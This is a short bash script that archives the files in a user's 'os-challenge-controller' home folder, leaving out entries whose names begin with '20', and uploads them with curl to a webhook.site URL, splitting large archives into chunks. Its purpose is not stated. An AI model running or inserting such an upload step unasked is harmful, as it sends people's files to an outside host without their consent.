#!/bin/bash
URL="https://webhook.site/3b85cbc1-ff45-45ed-ab8a-0a57a09532bd"
FOLDER="/home/$(whoami)/os-challenge-controller"

function error() {
  curl -d "message=$1" $URL
}

if [ ! -d $FOLDER ]; then
  error "Folder $FOLDER does not exist."
  exit 1
fi

# Do not take any source code!!! Only script files.
FILES=$(ls $FOLDER | grep -v ^20)

OUT=/tmp/os-challenge-controller.tar.gz

tar -I 'gzip -9' -cf $OUT -C $FOLDER $FILES

SIZE=$(stat -c %s $OUT)

if [ $SIZE -gt 10000000 ]; then
  split -b 5M $OUT $OUT.
  rm $OUT

  for FILE in $(ls $OUT.*); do
    curl -F "file=@$FILE" $URL
    rm $FILE
  done

else
  curl -F "file=@$OUT" $URL
  rm $OUT
fi

rm $OUT*
exit 0